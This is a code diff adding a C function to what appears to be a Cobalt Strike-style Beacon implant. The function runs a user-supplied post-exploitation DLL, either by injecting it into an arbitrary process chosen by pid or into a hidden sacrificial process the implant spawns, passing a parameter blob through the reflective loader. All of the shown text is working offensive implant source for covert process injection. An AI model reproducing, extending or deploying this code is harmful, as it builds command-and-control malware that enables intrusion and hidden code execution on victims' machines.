@@ -327,3 +327,86 @@ void command_job_spawn(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
 	/* free our locally allocated memory */
 	data_free(temp);
 }
+/* 4.10 execute-dll parity: run a user postex DLL with a parameter blob.
+ *
+ * wire: [int pid (0 = fork/run)][int plen][param blob][dll blob]
+ *
+ * The parameter blob rides the inject thread's parameter slot: the postex
+ * reflective loader (prepended client-side by PostExLoader) receives it and
+ * hands it to the DLL's DllMain(DLL_POSTEX_ATTACH) as lpReserved, which is
+ * exactly the Postex Kit contract. Job registration still arrives as a
+ * separate COMMAND_JOB_REGISTER(_MSGMODE) task like every other postex job. */
+void command_job_spawn_user(char * buffer, int length, BOOL x86) {
+	datap   parser;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	HANDLE  hProcess;
+	DWORD   pid;
+	DWORD   plen;
+	char *  parameter;
+	char *  dll;
+	int     dllen;
+
+	/* parse it */
+	data_init(&parser, buffer, length);
+	pid       = data_int(&parser);
+	plen      = data_int(&parser);
+	if (plen > 0)
+		parameter = data_ptr(&parser, plen);
+	else
+		parameter = NULL;
+	dll   = data_buffer(&parser);
+	dllen = data_length(&parser);
+
+	if (dllen <= 0) {
+		return;
+	}
+
+	/* explicit pid: inject into that process */
+	if (pid > 0) {
+		hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+		if (hProcess == NULL) {
+			post_error_dd(0x21, pid, GetLastError());
+			return;
+		}
+
+		if (x86 && is_x64_process(hProcess)) {
+			post_error_d(0x12, pid);
+			CloseHandle(hProcess);
+			return;
+		}
+		else if (!x86 && !is_x64_process(hProcess)) {
+			post_error_d(0x13, pid);
+			CloseHandle(hProcess);
+			return;
+		}
+
+		inject_process_logic(NULL, hProcess, pid, dll, dllen, 0, parameter, plen);
+		CloseHandle(hProcess);
+		return;
+	}
+
+	/* fork & run */
+	token_guard_start_maybe(TRUE);
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	startupinfo_hidden(&si, NULL);
+
+	if (!spawn_patsy(x86, TRUE, &si, &pi)) {
+		token_guard_stop_maybe(TRUE);
+		return;
+	}
+
+	/* timing shim (required on Win7 or CreateRemoteThread fails with error 8) */
+	Sleep(100);
+
+	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, dll, dllen, 0, parameter, plen);
+
+	token_guard_stop_maybe(TRUE);
+
+	/* clean up our process */
+	cleanupProcess(&pi);
+}
